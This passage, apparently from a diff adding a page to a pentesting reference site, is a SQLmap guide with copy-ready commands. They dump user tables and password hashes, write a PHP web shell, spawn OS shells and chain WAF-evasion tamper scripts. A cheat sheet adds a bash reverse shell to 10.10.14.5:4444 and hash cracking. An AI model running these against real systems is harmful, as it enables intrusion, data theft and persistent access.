+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Retrieve exact DBMS version banner</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--current-user</span> <span class="tok-flag">--is-dba</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Check if current session user is DBA</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--current-db</span> <span class="tok-flag">--hostname</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Current active database and system hostname</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--users</span> <span class="tok-flag">--passwords</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Enumerate DB user accounts and password hashes</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4. Data Dumping -->
+    <section class="content-section" id="dump" aria-labelledby="dump-title">
+      <h2 class="content-section__title" id="dump-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Data Dumping &amp; Exfiltration
+      </h2>
+      <div class="callout callout--info" role="note" style="margin-bottom: var(--sp-4);">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="callout__body">
+          <strong>Dumping optimization tips:</strong> When dumping large production tables, always use <code>--start=1 --stop=100</code> to limit row extraction. Add <code>--hex</code> if table fields contain binary data or special characters that corrupt terminal rendering. Use <code>--threads=5</code> to accelerate extraction without triggering database locking (do not exceed 10).
+        </div>
+      </div>
+
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Target Table Dump -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Dump specific table data with row constraints</div>
+              <div class="cmd-block__desc">Extract specific rows and columns rather than pulling the entire database.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">-D</span> <span class="tok-val">app_db</span> <span class="tok-flag">-T</span> <span class="tok-val">users</span> <span class="tok-flag">--dump</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">-D</span> <span class="tok-val">app_db</span> <span class="tok-flag">-T</span> <span class="tok-val">users</span> <span class="tok-flag">-C</span> <span class="tok-val">"username,password"</span> <span class="tok-flag">--start=1</span> <span class="tok-flag">--stop=50</span> <span class="tok-flag">--dump</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Full Schema Dump -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Dump full database schema without table contents</div>
+              <div class="cmd-block__desc">Quickly map the complete structure of all databases without transferring sensitive customer rows.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--schema</span> <span class="tok-flag">--batch</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">-D</span> <span class="tok-val">app_db</span> <span class="tok-flag">--dump-all</span> <span class="tok-flag">--exclude-sysdbs</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 5. OS Shell & File Access -->
+    <section class="content-section" id="shell" aria-labelledby="shell-title">
+      <h2 class="content-section__title" id="shell-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+        OS Shell &amp; File Access (Prerequisites &amp; Execution)
+      </h2>
+
+      <!-- Prerequisite Checklist Block -->
+      <div class="cmd-block is-open" style="border-color: rgba(232, 90, 74, 0.4); margin-bottom: var(--sp-4);" role="region" aria-label="OS Shell Prerequisites Checklist">
+        <div class="cmd-block__head" style="background: rgba(232, 90, 74, 0.08);">
+          <div>
+            <div class="cmd-block__label" style="color:var(--c-danger);">Before you run --os-shell: Mandatory 3-Point Checklist</div>
+            <div class="cmd-block__desc">Why --os-shell fails on 90% of modern targets without explicit database configuration prerequisites.</div>
+          </div>
+        </div>
+        <div class="cmd-block__body">
+          <div class="prose" style="padding: var(--sp-3) var(--sp-4);">
+            <ol style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+              <li>
+                <strong>Database user privileges:</strong> The connected database user must possess the <code>FILE</code> privilege (and ideally <code>SUPER</code> or <code>DBA</code> status). Verify via:
+                <div class="code-line" style="margin:var(--sp-2) 0;">
+                  <span class="code-line__prompt">$</span>
+                  <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--privileges</span></code>
+                </div>
+              </li>
+              <li>
+                <strong>MySQL secure_file_priv restriction:</strong> In modern MySQL/MariaDB setups, file I/O is governed by <code>secure_file_priv</code>. If set to <code>NULL</code>, file writing is completely blocked. If set to a directory path (e.g. <code>/var/lib/mysql-files/</code>), files can only be created inside that specific path. Test via:
+                <div class="code-line" style="margin:var(--sp-2) 0;">
+                  <span class="code-line__prompt">$</span>
+                  <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--sql-query=</span><span class="tok-val">"SELECT @@secure_file_priv"</span></code>
+                </div>
+              </li>
+              <li>
+                <strong>Writable web directory path:</strong> SQLmap must write a stager/backdoor file into the document root of the web server (e.g. <code>/var/www/html/</code>, <code>C:\inetpub\wwwroot\</code>). Obtain this path from error disclosures, phpinfo, or file reads.
+              </li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-list" role="list">
+        <!-- Block 1: OS Shell & OS Command -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Interactive OS shell &amp; one-off command execution</div>
+              <div class="cmd-block__desc">Spawn a pseudo-interactive shell or dispatch single commands through database UDF or web backdoor injection.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--os-shell</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--os-cmd=</span><span class="tok-val">"whoami"</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: File Read & File Write -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Arbitrary file read and remote file write</div>
+              <div class="cmd-block__desc">Extract configuration files or upload persistent web shells via the backend DBMS filesystem APIs.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--file-read=</span><span class="tok-val">"/etc/passwd"</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--file-write=</span><span class="tok-val">"shell.php"</span> <span class="tok-flag">--file-dest=</span><span class="tok-val">"/var/www/html/shell.php"</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 6. Tamper Scripts -->
+    <section class="content-section" id="tamper" aria-labelledby="tamper-title">
+      <h2 class="content-section__title" id="tamper-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m16 6-4-4-4 4"/><path d="M12 2v10.3"/><path d="m8 18 4 4 4-4"/><path d="M12 22v-4.7"/></svg>
+        Tamper Scripts (WAF Bypass &amp; Chaining)
+      </h2>
+      <div class="flags-table-wrap">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Tamper Script</th><th scope="col">Obfuscation Mechanism</th><th scope="col">Targeted Filter</th></tr></thead>
+          <tbody>
+            <tr><td><code class="flag-code">space2comment</code></td><td class="flag-desc">Replaces space characters with inline comments (<code>/**/</code>)</td><td class="flag-default">Standard space filters</td></tr>
+            <tr><td><code class="flag-code">randomcase</code></td><td class="flag-desc">Randomizes keyword casing (e.g. <code>sElEcT</code>, <code>uNiOn</code>)</td><td class="flag-default">Case-sensitive keyword filters</td></tr>
+            <tr><td><code class="flag-code">between</code></td><td class="flag-desc">Replaces <code>&gt;</code> operators with <code>BETWEEN</code> expressions</td><td class="flag-default">Angle bracket filters</td></tr>
+            <tr><td><code class="flag-code">charencode</code></td><td class="flag-desc">URL-encodes all non-alphanumeric characters</td><td class="flag-default">Signature pattern matchers</td></tr>
+            <tr><td><code class="flag-code">equaltolike</code></td><td class="flag-desc">Replaces <code>=</code> operators with <code>LIKE</code></td><td class="flag-default">Equality operator filters</td></tr>
+            <tr><td><code class="flag-code">base64encode</code></td><td class="flag-desc">Encodes entire injection payload into Base64</td><td class="flag-default">Base64-decoded parameters</td></tr>
+            <tr><td><code class="flag-code">versionedkeywords</code></td><td class="flag-desc">Encloses keywords inside MySQL version comments (<code>/*!50000SELECT*/</code>)</td><td class="flag-default">Generic WAF signatures</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="cmd-list" role="list" style="margin-top:var(--sp-4);">
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Chaining tamper scripts for modern WAFs (Cloudflare, AWS WAF, ModSecurity)</div>
+              <div class="cmd-block__desc">Layer multiple obfuscation transformations in pipeline order to slip past multi-stage WAF inspection.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--tamper=</span><span class="tok-val">space2comment,randomcase</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Basic 2-layer evasion combo</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--tamper=</span><span class="tok-val">space2comment,randomcase,equaltolike</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Intermediate 3-layer combo</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sqlmap</span> <span class="tok-flag">-u</span> <span class="tok-arg">"https://target/page?id=1"</span> <span class="tok-flag">--tamper=</span><span class="tok-val">space2comment,between,charencode,randomcase</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Aggressive 4-layer combo</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-warn); font-weight: 600;">Evasion Rule:</span> More tamper scripts are not always better. Each transformation adds processing overhead and may corrupt query syntax. Start with 1–2 scripts, verify positive response feedback, and layer additional scripts incrementally.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 7. Troubleshooting -->
+    <section class="content-section" id="troubleshooting" aria-labelledby="troubleshooting-title">
+      <h2 class="content-section__title" id="troubleshooting-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        Troubleshooting Common Failures
+      </h2>
+      <div class="flags-table-wrap">
+        <table class="flags-table" role="table">
+          <thead><tr><th scope="col">Symptom</th><th scope="col">Likely Cause</th><th scope="col">Remediation / Fix</th></tr></thead>
+          <tbody>
+            <tr>
+              <td class="flag-desc"><em>"Parameter does not seem injectable"</em> but manual test works</td>
+              <td>WAF or IDS blocking standard SQLmap payload signatures</td>
+              <td class="flag-default">Add <code>--random-agent</code> and <code>--tamper=space2comment</code></td>
+            </tr>
+            <tr>
+              <td class="flag-desc">Time-based blind injection is extremely slow or hanging</td>
+              <td>Default settings use <code>threads=1</code> and <code>time-sec=5</code></td>
+              <td class="flag-default">Accelerate with <code>--threads=10 --time-sec=2</code></td>
+            </tr>
+            <tr>
+              <td class="flag-desc">Detection fails on a redirecting authentication page</td>
+              <td>SQLmap follows HTTP 302 redirects and loses true payload response</td>
+              <td class="flag-default">Anchor detection using <code>--code=200</code> or <code>--string="Welcome"</code></td>
+            </tr>
+            <tr>
+              <td class="flag-desc">POST parameter is reported not injectable</td>
+              <td>Session cookies or CSRF nonces are stale or absent</td>
+              <td class="flag-default">Pass raw Burp request with <code>-r request.txt</code> or use <code>--cookie="session=..."</code></td>
+            </tr>
+            <tr>
+              <td class="flag-desc"><code>--os-shell</code> prompts for path then fails to write file</td>
+              <td>MySQL <code>secure_file_priv</code> restrictions or unprivileged web directory</td>
+              <td class="flag-default">Query <code>SELECT @@secure_file_priv</code> and write only to allowed directory, or use <code>--os-cmd</code></td>
+            </tr>
+            <tr>
+              <td class="flag-desc">Previous run reported "not injectable" but you adjusted WAF bypass</td>
+              <td>SQLmap cached the negative result in <code>~/.local/share/sqlmap/output/</code></td>
+              <td class="flag-default">Force clean evaluation with <code>--flush-session</code></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- 8. Cheatsheet -->
+    <section class="content-section" id="cheatsheet" aria-labelledby="cheatsheet-title">
+      <h2 class="content-section__title" id="cheatsheet-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+        Quick Cheatsheet &amp; Tool Chains
+      </h2>
+      <div class="cheat-grid">
+        <div class="cheat-cell"><div class="cheat-cell__label">Detect injection</div><div class="cheat-cell__code">sqlmap -u "https://target/page?id=1" --batch</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">List databases</div><div class="cheat-cell__code">sqlmap -u "https://target/page?id=1" --dbs</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">List tables in DB</div><div class="cheat-cell__code">sqlmap -u "https://target/page?id=1" -D app_db --tables</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Dump users table</div><div class="cheat-cell__code">sqlmap -u "https://target/page?id=1" -D app_db -T users --dump</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">From Burp request</div><div class="cheat-cell__code">sqlmap -r request.txt -p id --batch</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Fast &amp; safe technique</div><div class="cheat-cell__code">sqlmap -u "https://target/page?id=1" --technique=BEU</div></div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; SQLmap to John</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; SQLmap to Netcat</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Burp to SQLmap</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">sqlmap -r request.txt -p id --batch --level=3 --risk=2</div>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<script src="../assets/app.js"></script>
+<script>
+registerSearchItems([
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --batch --dbs', desc:'Detect & list databases in non-interactive batch mode', target:'sqlmap.html#enumeration' },
+  { tool:'SQLmap', cmd:'sqlmap -r request.txt -p id --batch', desc:'Test specific parameter from raw Burp request file', target:'sqlmap.html#detection' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --technique=BEU --batch', desc:'Fast & safe technique selection (Boolean, Error, Union)', target:'sqlmap.html#detection' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --os-shell', desc:'Spawn interactive OS shell (subject to FILE & path prerequisites)', target:'sqlmap.html#shell' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --privileges', desc:'Check database user permissions and FILE privilege', target:'sqlmap.html#shell' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --tamper=space2comment,randomcase', desc:'Layered WAF bypass tamper script chaining', target:'sqlmap.html#tamper' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --threads=10 --time-sec=2', desc:'Accelerate slow time-based blind extractions', target:'sqlmap.html#flags' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --flush-session', desc:'Clear stale cached false-negative detection session', target:'sqlmap.html#troubleshooting' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --random-agent', desc:'Evade signature-based WAF rules with randomized User-Agents', target:'sqlmap.html#flags' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"', desc:'Write remote web shell to server document root', target:'sqlmap.html#shell' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" -D app_db -T users --dump', desc:'Dump table contents and extract hashes', target:'sqlmap.html#dump' },
+  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --current-user --is-dba', desc:'Enumerate current database user and check DBA admin status', target:'sqlmap.html#enumeration' }
+]);
+</script>
+</body>
+</html>
